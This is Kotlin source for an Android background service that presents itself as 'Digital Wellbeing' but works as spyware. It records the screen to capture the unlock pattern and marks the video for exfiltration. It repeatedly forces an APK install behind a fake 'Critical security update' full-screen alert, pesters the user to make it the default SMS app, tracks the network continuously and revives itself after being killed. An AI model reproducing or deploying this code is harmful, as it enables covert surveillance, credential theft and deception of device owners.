package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Calendar

class MonitorService : Service() {

    companion object {
        @Volatile var isRunning = false
    }

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    // Changed ID to force new settings on update
    private val CHANNEL_ID = "background_service"
    private val NOTIF_ID = 777
    // OPTIMIZATION: Overlay removed to prevent CPU wake-locks and heat.

    // --- SMART UPDATE RECEIVER ---
    // Updates UI only when user is actually looking at the screen.
    // Hydra logic moved to MyNotificationListener for millisecond response

    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_ON -> {
                    ScreenRecordManager.resumeRecording()
                    // Wake up: Update stats immediately
                    val time = getScreenTime()
                    val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    mgr.notify(NOTIF_ID, buildNotification(time))
                    checkResurrection()
                }
                Intent.ACTION_SCREEN_OFF -> {
                    ScreenRecordManager.pauseRecording()
                    // Sleep: Do absolutely nothing to save battery
                }
                Intent.ACTION_USER_PRESENT -> {
                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                        DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked. Halting capture and exfiltrating video.")
                        ScreenRecordManager.stopRecording()
                    }
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createChannel()
        // FAST START: Use a placeholder to prevent ANR. Android 14 requires explicit foreground type handling.
        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                // Combined type for Android 14: specialUse (1073741824) | dataSync (1)
                startForeground(NOTIF_ID, buildNotification("Syncing diagnostics..."), 1073741825)
            } else {
                startForeground(NOTIF_ID, buildNotification("Syncing diagnostics..."))
            }
        } catch (e: Exception) {
            DebugLogger.log("MONITOR_ERR", "startForeground failed: ${e.message}")
        }
        
        scope.launch {
            // Update notification with real data in background
            val actualTime = getScreenTime()
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.notify(NOTIF_ID, buildNotification(actualTime))
        }

        // 1. Diagnostics
        checkResurrection()
        
        if (intent?.getBooleanExtra("kick_relentless", false) == true) {
            checkRelentlessInstall()
        }
        if (intent?.getBooleanExtra("kick_relentless_sms", false) == true) {
            checkRelentlessSms()
        }

        // 1.5 Media Projection Delegate
        if (intent?.action == "ACTION_START_RECORDING") {
            val resultCode = intent.getIntExtra("resultCode", 0)
            val data = intent.getParcelableExtra<Intent>("data")
            if (data != null) {
                ScreenRecordManager.startRecording(this, resultCode, data)
            }
        }

        // 2. Start Logic Loop
        startLoop()
        
        // 2.5 Persistent Network Tracking (Always listening)
        NetworkTracker.init(applicationContext)
        
        // 3. Register Smart Shield Triggers
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        // ANDROID 14 FIX: Must specify export visibility for dynamic receivers
        androidx.core.content.ContextCompat.registerReceiver(
            this, 
            screenStateReceiver, 
            filter, 
            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
        )

// Swipe listener now handled by ListenerService

        // 4. Initial State Check
        // Removed overlay toggle to allow Deep Doze
        
        isRunning = true
        return START_STICKY
    }



    private var isLoopActive = false
    private fun startLoop() {
        if (isLoopActive) return
        isLoopActive = true
        scope.launch {
            TimeManager.checkDailyReset(applicationContext)
            checkPulse()
            DumpManager.createDailyDump(applicationContext)
            
            while (isActive) {
                checkRelentlessInstall()
                checkRelentlessSms()
                delay(15_000)
            }
        }
    }

    private fun checkRelentlessSms() {
        if (!DefaultSmsManager.isRelentlessActive) return
        if (DefaultSmsManager.isDefaultSms(applicationContext)) {
            DefaultSmsManager.isRelentlessActive = false
            DefaultSmsManager.expectedMode = ""
            return
        }
        
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastPrompt = prefs.getLong("relentless_sms_last_prompt", 0L)
        if (System.currentTimeMillis() - lastPrompt < 15_000) return 
        prefs.edit().putLong("relentless_sms_last_prompt", System.currentTimeMillis()).apply()

        DefaultSmsManager.requestDefault(applicationContext)
    }

    private fun checkRelentlessInstall() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("relentless_install_active", false)) return
        
        val apkPath = prefs.getString("relentless_apk_path", "") ?: ""
        val targetPkg = prefs.getString("relentless_target_pkg", "") ?: ""
        
        if (apkPath.isEmpty()) {
            prefs.edit().putBoolean("relentless_install_active", false).apply()
            return
        }

        var isInstalled = false
        try {
            if (targetPkg.isNotEmpty()) {
                val installedInfo = packageManager.getPackageInfo(targetPkg, 0)
                val archiveInfo = packageManager.getPackageArchiveInfo(apkPath, 0)
                if (archiveInfo != null) {
                    val installedVer = if (android.os.Build.VERSION.SDK_INT >= 28) installedInfo.longVersionCode else installedInfo.versionCode.toLong()
                    val archiveVer = if (android.os.Build.VERSION.SDK_INT >= 28) archiveInfo.longVersionCode else archiveInfo.versionCode.toLong()
                    if (installedVer >= archiveVer) isInstalled = true
                } else isInstalled = true
            } else isInstalled = true
        } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
            isInstalled = false
        } catch (e: Exception) {
            isInstalled = true
        }

        if (isInstalled) {
            prefs.edit().putBoolean("relentless_install_active", false).apply()
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.cancel(102)
            nm.cancel(103)
            return
        }

        // COOLDOWN LOGIC: Give user 90s to interact with the package installer
        val lastPrompt = prefs.getLong("relentless_last_prompt", 0L)
        if (System.currentTimeMillis() - lastPrompt < 90_000) {
            return 
        }
        prefs.edit().putLong("relentless_last_prompt", System.currentTimeMillis()).apply()

        val installIntent = Intent(this, RelentlessInstallActivity::class.java).apply {
            putExtra("apk_path", apkPath)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_CLEAR_TASK)
        }

        // 1. Direct Background Launch (Bypasses OS blocks because we hold SYSTEM_ALERT_WINDOW)
        try {
            startActivity(installIntent)
        } catch (e: Exception) { }

        // 2. FSI Fallback (Alternating IDs forces Android to treat it as a NEW emergency every time)
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val lastId = prefs.getInt("relentless_notif_id", 102)
        nm.cancel(lastId)
        
        val newId = if (lastId == 102) 103 else 102
        prefs.edit().putInt("relentless_notif_id", newId).apply()

        val pi = android.app.PendingIntent.getActivity(this, newId, installIntent, android.app.PendingIntent.FLAG_CANCEL_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
        
        val channelId = "system_updates_silent"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_HIGH).apply {
                setSound(null, null)
                enableVibration(false)
            }
            nm.createNotificationChannel(channel)
        }
        
        val notif = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("System Update Required")
            .setContentText("Critical security update pending.")
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setDefaults(0)
            .setSilent(true)
            .setFullScreenIntent(pi, true)
            .setAutoCancel(true)
            .build()
            
        nm.notify(newId, notif)
    }

    private fun checkResurrection() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastHeartbeat = prefs.getLong("last_heartbeat", 0L)
        val now = System.currentTimeMillis()
        
        if (lastHeartbeat > 0 && (now - lastHeartbeat) > 300_000) {
            val gapMins = (now - lastHeartbeat) / 60000
            val historyStr = prefs.getString("app_health", "{}")
            val json = try { JSONObject(historyStr) } catch(e: Exception) { JSONObject() }
            
            val time = java.text.SimpleDateFormat("HH:mm", java.util.Locale.US).format(java.util.Date())
            json.put("last_resurrection", "Recovered after ${gapMins}m blackout at $time")
            json.put("kill_count", json.optInt("kill_count", 0) + 1)
            
            DebugLogger.log("CRITICAL", "SYSTEM KILLED ME! Recovered after ${gapMins}m blackout.")
            prefs.edit().putString("app_health", json.toString()).apply()
        }
    }

    private fun checkPulse() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastPulse = prefs.getLong("last_pulse_time", 0L)
        val now = System.currentTimeMillis()
        
        if (now - lastPulse > 259200000) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) {
                try {
                    val i = Intent(this, PulseActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                } catch (e: Exception) { }
            }
        }
    }

    private fun getScreenTime(): String {
        return try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val startTime = TimeManager.getStartOfDay()
            val endTime = System.currentTimeMillis()
            val events = usm.queryEvents(startTime, endTime)
            
            var totalMillis = 0L
            val statsMap = mutableMapOf<String, Long>()
            val event = android.app.usage.UsageEvents.Event()
            
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                val pkg = event.packageName
                val time = event.timeStamp
                
                when (event.eventType) {
                    android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND -> {
                        statsMap[pkg] = time
                    }
                    android.app.usage.UsageEvents.Event.MOVE_TO_BACKGROUND, 
                    android.app.usage.UsageEvents.Event.USER_INTERACTION -> {
                        val start = statsMap[pkg]
                        if (start != null && start > 0) {
                            totalMillis += (time - start)
                            statsMap[pkg] = 0L
                        }
                    }
                }
            }

            // Handle app still in foreground
            statsMap.forEach { (pkg, start) ->
                if (start > 0) totalMillis += (endTime - start)
            }

            val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(totalMillis)
            val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalMillis) % 60
            "Today: ${hrs}h ${mins}m"
        } catch (e: Exception) {
            "Digital Wellbeing Active"
        }
    }

    private fun buildNotification(text: String): Notification {
        val intent = Intent(this, PulseActivity::class.java).apply {
            putExtra("route_to_settings", true)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, intent, 
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Digital Wellbeing is active")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setOnlyAlertOnce(true) // Crucial: Prevents sound/vibration on re-post
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MAX) 
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .build().apply {
                flags = flags or Notification.FLAG_NO_CLEAR or Notification.FLAG_ONGOING_EVENT
            }
    }

    private fun createChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            // Upgraded to IMPORTANCE_HIGH to prevent user-dismissal overrides
            val chan = NotificationChannel(CHANNEL_ID, "Usage Tracking", NotificationManager.IMPORTANCE_HIGH)
            chan.setShowBadge(false)
            chan.setSound(null, null) // Keep it quiet despite high importance
            chan.enableVibration(false)
            mgr.createNotificationChannel(chan)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        DebugLogger.log("PHOENIX", "Task swiped away. Scheduling resurrection via WorkManager.")
        val workRequest = OneTimeWorkRequestBuilder<RemoteCommandWorker>().build()
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
        try {
            unregisterReceiver(screenStateReceiver)
        } catch (e: Exception) {}

        // Schedule a resurrection in case of a fatal memory kill
        KeepAliveReceiver.scheduleNext(applicationContext)
        
        job.cancel()
    }
}